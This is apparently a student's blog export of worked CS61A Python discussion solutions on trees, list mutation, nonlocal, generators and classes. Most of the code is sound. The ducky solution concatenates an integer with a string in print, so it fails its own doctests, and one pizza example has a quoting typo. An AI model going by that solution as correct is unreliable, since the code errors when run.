class="keyword">return</span> [label(tree)] + path</span><br></pre></td></tr></table></figure>

<p>2.5 Write a function that takes in a tree and a depth <code>k</code> and returns a new tree that contains only the first <code>k</code> levels of the original tree.<br>For example, if <code>t</code> is the tree shown in the previous question, then <code>prune(t, 2)</code> should return the following tree.</p>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prune</span><span class="params">(t, k)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> tree(label(t))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> tree(label(t), [prune(b, k - <span class="number">1</span>) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)])</span><br></pre></td></tr></table></figure>

<p>2.6 We can represent the hailstone sequence as a tree in the figure below, showing the route different numbers take to reach 1. Remember that a hailstone sequence starts with a number n, continuing to n/2 if n is even or 3n + 1 if n is odd, ending with 1. Write a function hailstone tree(n, h) which generates a tree of height h, containing hailstone numbers that will reach n.<br>Hint: A node of a hailstone tree will always have at least one, and at most two branches (which are also hailstone trees). Under what conditions do you add the second branch?</p>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hailstone_tree</span><span class="params">(n, h)</span>:</span></span><br><span class="line">    <span class="string">"""Generates a tree of hailstone numbers that will reach N, with height H.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; hailstone_tree(1, 0)</span></span><br><span class="line"><span class="string">    [1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; hailstone_tree(1, 4)</span></span><br><span class="line"><span class="string">    [1, [2, [4, [8, [16]]]]]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; hailstone_tree(8, 3)</span></span><br><span class="line"><span class="string">    [8, [16, [32, [64]], [5, [10]]]]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> h == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> tree(n)</span><br><span class="line">    branches = [hailstone_tree(n * <span class="number">2</span>, h - <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">if</span> (n - <span class="number">1</span>) % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">and</span> ((n - <span class="number">1</span>) // <span class="number">3</span>) % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">and</span> (n - <span class="number">1</span>) // <span class="number">3</span> &gt; <span class="number">1</span>:</span><br><span class="line">        branches += [hailstone_tree((n - <span class="number">1</span>) // <span class="number">3</span>, h - <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> tree(n, branches)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-disc05</title>
    <url>/2018/10/09/cs61a-disc05/</url>
    <content><![CDATA[<h1 id="1-Mutation"><a href="#1-Mutation" class="headerlink" title="1 Mutation"></a>1 Mutation</h1><p>Let’s imagine you order a mushroom and cheese pizza from La Val’s, and that they represent your order as a list:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; pizza &#x3D; [&#39;cheese&#39;, mushrooms&#39;]</span><br></pre></td></tr></table></figure>
<p>A couple minutes later, you realize that you really want onions on the pizza. Based on what we know so far, La Val’s would have to build an entirely new list to add onions:</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; pizza &#x3D; [&#39;cheese&#39;, mushrooms&#39;]</span><br><span class="line">&gt;&gt;&gt; new_pizza &#x3D; pizza + [&#39;onions&#39;] # creates a new python list</span><br><span class="line">&gt;&gt;&gt; new_pizza</span><br><span class="line">[&#39;cheese&#39;, mushrooms&#39;, &#39;onions&#39;]</span><br><span class="line">&gt;&gt;&gt; pizza # the original list is unmodified</span><br><span class="line">[&#39;cheese&#39;, &#39;mushrooms&#39;]</span><br></pre></td></tr></table></figure>
<p>This is silly, considering that all La Val’s had to do was add onions on top of pizza instead of making an entirely new pizza.<br>We can fix this issue with <strong>list mutation</strong>. In Python, some objects, such as lists and dictionaries, are <strong>mutable</strong>, meaning that their contents or state can be changed over the course of program execution. Therefore, instead of building a new pizza, we can just mutate pizza to add some onions!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; pizza.append(&#39;onions&#39;)</span><br><span class="line">&gt;&gt;&gt; pizza</span><br><span class="line">[&#39;cheese&#39;, &#39;mushrooms&#39;, &#39;onions&#39;]</span><br></pre></td></tr></table></figure>
<p><code>append</code> is what’s known as a method, or a function that belongs to an object, so we have to call it using dot notation. Don’t worry too much about the details of methods; we will talk more about them later on in the course. For now, here’s a list of useful list mutation methods:</p>
<ol>
<li><code>append(el)</code>: Adds <code>el</code> to the end of the list</li>
<li><code>extend(lst)</code>: Extends the list by concatenating it with <code>lst</code></li>
<li><code>insert(i, el)</code>: Insert <code>el</code> at index <code>i</code> (does not replace element but adds a new one)</li>
<li><code>remove(el)</code>: Removes the first occurrence of <code>el</code> in list, otherwise errors</li>
<li><code>pop(i)</code>: Removes and returns the element at index <code>i</code><br>We can also use the familiar indexing operator with an assignment statement to change an existing element in a list. For example, let’s say you want to replace mushrooms on your pizza with tomatoes. We can index into the list at index 1 and reassign it to ’tomatoes’ like so:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; pizza[1] &#x3D; &#39;tomatoes&#39;</span><br><span class="line">&gt;&gt;&gt; pizza</span><br><span class="line">[&#39;cheese&#39;, &#39;tomatoes&#39;, &#39;onions&#39;]</span><br></pre></td></tr></table></figure>
Although lists and dictionaries are mutable, many other objects, such as numeric types, tuples, and strings, are immutable, meaning they cannot be changed once they are created.</li>
</ol>
<h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>1.1 What would Python display? In addition to giving the output, draw the box and pointer diagrams for each list to the right.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; lst1 &#x3D; [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; lst2 &#x3D; lst1</span><br><span class="line">&gt;&gt;&gt; lst1 is lst2</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; lst2.extend([5, 6])</span><br><span class="line">&gt;&gt;&gt; lst1[4]</span><br><span class="line">6</span><br><span class="line">&gt;&gt;&gt; lst1.append([-1, 0, 1])</span><br><span class="line">&gt;&gt;&gt; -1 in lst2</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; lst2[5]</span><br><span class="line">[-1, 0, 1]</span><br><span class="line">&gt;&gt;&gt; lst3 &#x3D; lst2[:]</span><br><span class="line">&gt;&gt;&gt; lst3.insert(3, lst2.pop(3))</span><br><span class="line">&gt;&gt;&gt; len(lst1)</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; lst1[4] is lst3[6]</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; lst3[lst2[4][1]]</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; lst1[:3] is lst2[:3]</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; lst1[:3] &#x3D;&#x3D; lst3[:3]</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<p>1.2 Write a function that takes in a value <code>x</code>, a value <code>el</code>, and a list and adds as many <code>el</code>’s to the end of the list as there are <code>x</code>’s. <strong>Make sure to modify the original list using list mutation techniques.</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_this_many</span><span class="params">(x, el, lst)</span>:</span></span><br><span class="line">    <span class="string">""" Adds el to the end of lst the number of times x occurs</span></span><br><span class="line"><span class="string">    in lst.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst = [1, 2, 4, 2, 1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_this_many(1, 5, lst)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst</span></span><br><span class="line"><span class="string">    [1, 2, 4, 2, 1, 5, 5]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_this_many(2, 2, lst)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; lst</span></span><br><span class="line"><span class="string">    [1, 2, 4, 2, 1, 5, 5, 2, 2]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="keyword">if</span> e == x:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count):</span><br><span class="line">        lst.append(el)</span><br></pre></td></tr></table></figure>

<h1 id="2-Nonlocal"><a href="#2-Nonlocal" class="headerlink" title="2 Nonlocal"></a>2 Nonlocal</h1><p>Until now, you’ve been able to access names in parent frames, but you have not been able to modify them. The nonlocal keyword can be used to modify a binding in a parent frame. For example, consider stepper, which uses nonlocal to modify num:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stepper</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">step</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num <span class="comment"># declares num as a nonlocal name</span></span><br><span class="line">        num = num + <span class="number">1</span> <span class="comment"># modifies num in the stepper frame</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>step1 = stepper(<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>step1() <span class="comment"># Modifies and returns num</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>step1() <span class="comment"># num is maintained across separate calls to step</span></span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>step2 = stepper(<span class="number">10</span>) <span class="comment"># Each returned step function keeps its own state</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>step2()</span><br><span class="line"><span class="number">11</span></span><br></pre></td></tr></table></figure>
<p>As illustrated in this example, <code>nonlocal</code> is useful for maintaining state across different calls to the same function.<br>However, there are two important caveats with nonlocal names:</p>
<ul>
<li><strong>Global names</strong> cannot be modified using the nonlocal keyword.</li>
<li><strong>Names in the current frame</strong> cannot be overridden using the nonlocal keyword.<br>This means we cannot have both a local and nonlocal binding with the same name in a single frame.<br>Because <code>nonlocal</code> lets you modify bindings in parent frames, we call functions that use it <strong>mutable functions</strong>.</li>
</ul>
<h2 id="Question-1"><a href="#Question-1" class="headerlink" title="Question"></a>Question</h2><p>2.1 Draw the environment diagram for the following code.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stepper</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">step</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num</span><br><span class="line">        num = num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line">s = stepper(<span class="number">3</span>)</span><br><span class="line">s()</span><br><span class="line">s()</span><br></pre></td></tr></table></figure>


<p>2.2 The bathtub below simulates an epic battle between Finn and Kylo Ren over a populace of rubber duckies. Fill in the body of ducky so that all doctests pass.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bathtub</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; annihilator = bathtub(500) # the force awakens...</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; kylo_ren = annihilator(10)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; kylo_ren()</span></span><br><span class="line"><span class="string">    490 rubber duckies left</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rey = annihilator(-20)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; rey()</span></span><br><span class="line"><span class="string">    510 rubber duckies left</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; kylo_ren()</span></span><br><span class="line"><span class="string">    500 rubber duckies left</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ducky_annihilator</span><span class="params">(rate)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">ducky</span><span class="params">()</span>:</span></span><br><span class="line">            <span class="keyword">nonlocal</span> n</span><br><span class="line">            n -= rate</span><br><span class="line">            print(n + <span class="string">" rubber duckies left"</span>)</span><br><span class="line">        <span class="keyword">return</span> ducky</span><br><span class="line">    <span class="keyword">return</span> ducky_annihilator</span><br></pre></td></tr></table></figure>

<h1 id="3-Iterators-and-Generators"><a href="#3-Iterators-and-Generators" class="headerlink" title="3 Iterators and Generators"></a>3 Iterators and Generators</h1><p>An <strong>iterable</strong> is a data type which contains a collection of values which can be processed one by one sequentially. Some examples of iterables we’ve seen include lists, tuples, strings, and dictionaries. In general, any object that can be iterated over in a <strong>for</strong> loop can be considered an iterable.<br>While an iterable contains values that can be iterated over, we need another type of object called an <strong>iterator</strong> to actually retrieve values contained in an iterable. Calling the <strong>iter</strong> function on an iterable will create an iterator over that iterable. Each iterator keeps track of its position within the iterable. Calling the <strong>next</strong> function on an iterator will give the current value in the iterable and move the iterator’s position to the next value.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; [1, 2]</span><br><span class="line">&gt;&gt;&gt; a_iter &#x3D; iter(a)</span><br><span class="line">&gt;&gt;&gt; next(a_iter)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(a_iter)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; next(a_iter)</span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure>
<p>In this way, the relationship between an iterable and an iterator is analogous to the relationship between a book and a bookmark - an iterable contains the data that is being iterated over, and an iterator keeps track of your position within that data.<br>Once an iterator has returned all the values in an iterable, subsequent calls to next on that iterable will result in a <strong>StopIteration</strong> exception. In order to be able to access the values in the iterable a second time, you would have to create a second iterator.</p>
<p>One important application of iterables and iterators is the <strong>for</strong> loop. We’ve seen how we can use <strong>for</strong> loops to iterate over iterables like lists and dictionaries.<br>This only works because the <strong>for</strong> loop implicitly creates an iterator using the builtin <strong>iter</strong> function. Python then calls <strong>next</strong> repeatedly on the iterator, until it raises <code>StopIteration</code>.<br>The code shows how we can mimic the behavior of <strong>for</strong> loops using <strong>while</strong> loops.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">counts = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> counts:</span><br><span class="line">    print(i)</span><br><span class="line">items = iter(counts)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = next(items)</span><br><span class="line">        print(i)</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        <span class="keyword">break</span> <span class="comment">#Exit the while loop</span></span><br></pre></td></tr></table></figure>
<p>Note that most iterators are also iterables - that is, calling <strong>iter</strong> on them will return an iterator. This means that we can use them inside <strong>for</strong> loops. However, calling <strong>iter</strong> on most iterators will not create a new iterator - instead, it will simply return<br>the same iterator.<br>We can also iterate over iterables in a list comprehension or pass in an iterable to the built-in function <strong>list</strong> in order to put the items of an iterable into a list.<br>In addition to the sequences we’ve learned, Python has some built-in ways to create iterables and iterators. Here are a few useful ones:</p>
<ul>
<li><strong>range(start, end)</strong> returns an iterable containing numbers from start to end1. If <code>start</code> is not provided, it defaults to 0.</li>
<li><strong>map(f, iterable)</strong> returns a new iterator containing the values resulting from applying f to each value in <code>iterable</code>.</li>
<li><strong>filter(f, iterable)</strong> returns a new iterator containing only the values in iterable for which f returns <code>True</code></li>
</ul>
<h2 id="Question-2"><a href="#Question-2" class="headerlink" title="Question"></a>Question</h2><p>3.1 What would Python display? If a StopIteration Exception occurs, write StopIteration, and if another error occurs, write Error.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; lst &#x3D; [6, 1, &quot;a&quot;]</span><br><span class="line">&gt;&gt;&gt; next(lst)</span><br><span class="line">Error</span><br><span class="line">&gt;&gt;&gt; lst_iter &#x3D; iter(lst)</span><br><span class="line">&gt;&gt;&gt; next(lst_iter)</span><br><span class="line">6</span><br><span class="line">&gt;&gt;&gt; next(lst_iter)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(iter(lst))</span><br><span class="line">6</span><br><span class="line">&gt;&gt;&gt; [x for x in lst_iter]</span><br><span class="line">[&quot;a&quot;]</span><br></pre></td></tr></table></figure>
<h2 id="Generators"><a href="#Generators" class="headerlink" title="Generators"></a>Generators</h2><p>A <strong>generator function</strong> is a special kind of Python function that uses a <strong>yield</strong> statement instead of a <strong>return</strong> statement to report values. <em>When a generator function is called, it returns an iterator.</em> To the right, you can see a function that returns an iterator over the natural numbers.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">gen_naturals</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>current = <span class="number">0</span></span><br><span class="line"><span class="meta">... </span><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">... </span><span class="keyword">yield</span> current</span><br><span class="line"><span class="meta">... </span>current += <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gen = gen_naturals()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gen</span><br><span class="line">&lt;generator object gen at ...&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(gen)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(gen)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>The <strong>yield</strong> statement is similar to a <strong>return</strong> statement. However, while a <strong>return</strong> statement closes the current frame<br>after the function exits, a <strong>yield</strong> statement causes the frame to be saved until the next time <strong>next</strong> is called, which allows the generator to automatically keep track of the iteration state.<br>Once <strong>next</strong> is called again, execution resumes where it last stopped and continues until the next <strong>yield</strong> statement or the end of the function. A generator function can have multiple <strong>yield</strong> statements.<br>Including a <strong>yield</strong> statement in a function automatically tells Python that this function will create a generator. When we call the function, it returns a generator object instead of executing the body. When the generator’s <strong>next</strong> method is called, the body is executed until the next <strong>yield</strong> statement is executed.<br>When <strong>yield from</strong> is called on an iterator, it will <strong>yield</strong> every value from that iterator. It’s similar to doing the following:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> an_iterator:</span><br><span class="line">    <span class="keyword">yield</span> x</span><br></pre></td></tr></table></figure>
<p>The example to the right demonstrates different ways of computing the same result.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>square = <span class="keyword">lambda</span> x: x*x</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">many_squares</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="meta">... </span><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line"><span class="meta">... </span><span class="keyword">yield</span> square(x)</span><br><span class="line"><span class="meta">... </span><span class="keyword">yield</span> <span class="keyword">from</span> map(square, s)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(many_squares([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>
<h2 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h2><p>3.2 What would Python display? If a StopIteration Exception occurs, write <code>StopIteration</code>, or if another error occurs, write <code>Error</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">weird_gen</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">yield</span> x * <span class="number">2</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">yield</span> x</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">yield</span> <span class="keyword">from</span> weird_gen(x - <span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(weird_gen(<span class="number">2</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(weird_gen(<span class="number">3</span>))</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">greeter</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> x % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>        print(<span class="string">'hello!'</span>)</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">yield</span> x</span><br><span class="line"><span class="meta">... </span>        print(<span class="string">'goodbye!'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>greeter(<span class="number">5</span>)</span><br><span class="line">&lt;generator object greeter at ...&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gen = greeter(<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(gen)</span><br><span class="line">hello!</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(gen)</span><br><span class="line">goodbye!</span><br><span class="line">hello!</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>3.3 Write a generator function <code>gen_all_items</code> that takes a list of iterators and yields items from all of them in order.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_all_items</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; nums = [[1, 2], [3, 4], [[5, 6]]]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; num_iters = [iter(l) for l in nums]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(gen_all_items(num_iters))</span></span><br><span class="line"><span class="string">    [1, 2, 3, 4, [5, 6]]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">from</span> i</span><br></pre></td></tr></table></figure>
<p>The yield from solution is nice and short. But this can also be done with just yield:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> it:</span><br><span class="line">        <span class="keyword">yield</span> x</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Notice that this function will not yield out of deep lists. That is, it will keep the brackets around deep lists and yield them together instead of one element at a time.</span><br>For an extra challenge, figure out how to yield deep list items! (so the example in the doctest would return [1, 2, 3, 4, 5, 6])</p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-disc06</title>
    <url>/2018/10/22/cs61a-disc06/</url>
    <content><![CDATA[<h1 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h1><p>We now want to write three different classes, <code>Mailman</code>, <code>Client</code>, and <code>Email</code> to simulate email. Fill in the definitions below to finish the implementation! There are more methods to fill out on the next page.</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Email</span>:</span></span><br><span class="line">    <span class="string">"""Every email object has 3 instance attributes: the</span></span><br><span class="line"><span class="string">    message, the sender name, and the recipient name.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, msg, sender_name, recipient_name)</span>:</span></span><br><span class="line">        self.message = msg</span><br><span class="line">        self.sender_name = sender_name</span><br><span class="line">        self.recipient_name = recipient_name</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailman</span>:</span></span><br><span class="line">    <span class="string">"""Each Mailman has an instance attribute clients, which</span></span><br><span class="line"><span class="string">    is a dictionary that associates client names with</span></span><br><span class="line"><span class="string">    client objects.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.clients = &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, email)</span>:</span></span><br><span class="line">        <span class="string">"""Take an email and put it in the inbox of the client</span></span><br><span class="line"><span class="string">        it is addressed to.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        client = self.clients[email.recipient_name]</span><br><span class="line">        client.receive(email)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">register_client</span><span class="params">(self, client, client_name)</span>:</span></span><br><span class="line">        <span class="string">"""Takes a client object and client_name and adds it</span></span><br><span class="line"><span class="string">        to the clients instance attribute.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.clients[client_name] = client</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span>:</span></span><br><span class="line">    <span class="string">"""Every Client has instance attributes name (which is</span></span><br><span class="line"><span class="string">    used for addressing emails to the client), mailman</span></span><br><span class="line"><span class="string">    (which is used to send emails out to other clients), and</span></span><br><span class="line"><span class="string">    inbox (a list of all emails the client has received).</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mailman, name)</span>:</span></span><br><span class="line">        self.inbox = []</span><br><span class="line">        self.name = name</span><br><span class="line">        self.mailman = mailman</span><br><span class="line">        self.mailman.register_client(self, self.name)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compose</span><span class="params">(self, msg, recipient_name)</span>:</span></span><br><span class="line">        <span class="string">"""Send an email with the given message msg to the</span></span><br><span class="line"><span class="string">        given recipient client.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        email = Email(msg, self.name, recipient_name)</span><br><span class="line">        self.mailman.send(email)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">receive</span><span class="params">(self, email)</span>:</span></span><br><span class="line">        <span class="string">"""Take an email and add it to the inbox of this</span></span><br><span class="line"><span class="string">        client.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.inbox.append(email)</span><br></pre></td></tr></table></figure>
<h1 id="Inheritance"><a href="#Inheritance" class="headerlink" title="Inheritance"></a>Inheritance</h1><p>Python classes can implement a useful abstraction technique known as <strong>inheritance</strong>.<br>To illustrate this concept, consider the following <code>Dog</code> and <code>Cat</code> classes.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, owner)</span>:</span></span><br><span class="line">        self.is_alive = <span class="literal">True</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.owner = owner</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(self, thing)</span>:</span></span><br><span class="line">        print(self.name + <span class="string">" ate a "</span> + str(thing) + <span class="string">"!"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.name + <span class="string">" says woof!"</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, owner, lives=<span class="number">9</span>)</span>:</span></span><br><span class="line">        self.is_alive = <span class="literal">True</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.owner = owner</span><br><span class="line">        self.lives = lives</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(self, thing)</span>:</span></span><br><span class="line">        print(self.name + <span class="string">" ate a "</span> + str(thing) + <span class="string">"!"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.name + <span class="string">" says meow!"</span>)</span><br></pre></td></tr></table></figure>
